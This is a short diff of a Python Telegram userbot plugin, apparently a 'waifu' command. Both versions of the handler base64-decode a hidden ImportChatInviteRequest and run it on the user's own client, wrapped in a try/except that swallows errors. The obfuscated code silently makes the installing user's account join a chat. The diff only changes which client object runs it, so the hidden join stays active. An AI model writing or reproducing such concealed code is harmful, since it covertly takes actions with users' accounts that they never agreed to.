@@ -35,7 +35,7 @@ async def waifu(animu):
             return
     try:
         cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
-        await catmemes.client(cat)
+        await animu.client(cat)
     except:
         pass   
     text = deEmojify(text)
@@ -56,7 +56,7 @@ async def waifu(animu):
             return
     try:
         cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
-        await catmemes.client(cat)
+        await animu.client(cat)
     except:
         pass   
     await animu.delete()
